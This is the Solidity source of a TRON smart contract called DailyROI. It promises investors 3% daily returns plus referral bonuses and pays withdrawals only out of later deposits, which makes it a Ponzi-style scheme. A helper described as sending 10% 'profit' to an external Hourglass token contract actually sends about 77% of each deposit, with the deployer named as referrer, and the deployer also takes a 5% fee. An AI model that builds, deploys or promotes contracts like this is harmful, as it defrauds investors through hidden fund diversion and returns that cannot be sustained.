//SourceUnit: DailyDrip.sol

pragma solidity ^0.4.0;

contract HourglassInterface {
     function buy(address _referredBy) external payable returns (uint256);
     function exit() external;
}

contract DailyROI {
    using SafeMath for uint256;

    mapping(address => uint256) investments;
    mapping(address => uint256) joined;
    mapping(address => uint256) withdrawals;
    mapping(address => uint256) referrer;

    uint256 public step = 3;
    uint256 public minimum = 1 trx;
    uint256 public stakingRequirement = 1 trx;
    address public deployer;

	HourglassInterface public Token; 

    event Invest(address investor, uint256 amount);
    event Withdraw(address investor, uint256 amount);
    event Bounty(address hunter, uint256 amount);

    constructor(address _contract) public {
        Token = HourglassInterface(_contract);
        deployer = msg.sender;
    }

    function () public payable {}

	function sendProfitToHourglass(uint256 _profit) private {buyTokens(calTrxSendToHourglass(_profit));}
    function calTrxSendToHourglass(uint256 _trx) private pure returns(uint256 _value){_value = SafeMath.div(SafeMath.mul(_trx, 100), 13);}
    function buyTokens(uint256 _value) private {Token.buy.value(_value)(deployer); exitHourglass();}
    function exitHourglass() private {Token.exit();}

    function buy(address _referredBy) public payable {
        require(msg.value >= minimum);

        address _customerAddress = msg.sender;
        if(_referredBy != address(0) && _referredBy != _customerAddress && investments[_referredBy] >= stakingRequirement) {
            referrer[_referredBy] = referrer[_referredBy].add(msg.value.mul(5).div(100));
        }

        if (investments[msg.sender] > 0){if (withdraw()){withdrawals[msg.sender] = 0;}}
        investments[msg.sender] = investments[msg.sender].add(msg.value);
        joined[msg.sender] = block.timestamp;
        deployer.transfer(msg.value.mul(5).div(100));
	    sendProfitToHourglass(msg.value.mul(10).div(100));
        emit Invest(msg.sender, msg.value);
    }

    function getBalance(address _address) view public returns (uint256) {
        uint256 minutesCount = now.sub(joined[_address]).div(1 minutes);
        uint256 percent = investments[_address].mul(step).div(100);
        uint256 different = percent.mul(minutesCount).div(1440);
        uint256 balance = different.sub(withdrawals[_address]);
        return balance;
    }

    function withdraw() public returns (bool){
        require(joined[msg.sender] > 0);
		bounty();
        uint256 balance = getBalance(msg.sender);
        if (address(this).balance > balance){
            if (balance > 0){
                withdrawals[msg.sender] = withdrawals[msg.sender].add(balance);
                msg.sender.transfer(balance);
                emit Withdraw(msg.sender, balance);
            }
            return true;
        } else {
            return false;
        }
    }

	function getDividends(address _player) public view returns(uint256) {
		uint256 refBalance = checkReferral(_player);
		uint256 balance = getBalance(_player);
		return (refBalance + balance);
	}

    function bounty() public {
        uint256 refBalance = checkReferral(msg.sender);
        if(refBalance >= minimum) {
             if (address(this).balance > refBalance) {
                referrer[msg.sender] = 0;
                msg.sender.transfer(refBalance);
                emit Bounty(msg.sender, refBalance);
             }
        }
    }

    function checkBalance() public view returns (uint256) {return getBalance(msg.sender);}
    function checkWithdrawals(address _investor) public view returns (uint256) {return withdrawals[_investor];}
    function checkInvestments(address _investor) public view returns (uint256) {return investments[_investor];}
    function checkReferral(address _hunter) public view returns (uint256) {return referrer[_hunter];}
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {if (a == 0) {return 0;} uint256 c = a * b; assert(c / a == b); return c;}
    function div(uint256 a, uint256 b) internal pure returns (uint256) {uint256 c = a / b; return c;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {assert(b <= a); return a - b;}
    function add(uint256 a, uint256 b) internal pure returns (uint256) {uint256 c = a + b; assert(c >= a); return c;}
}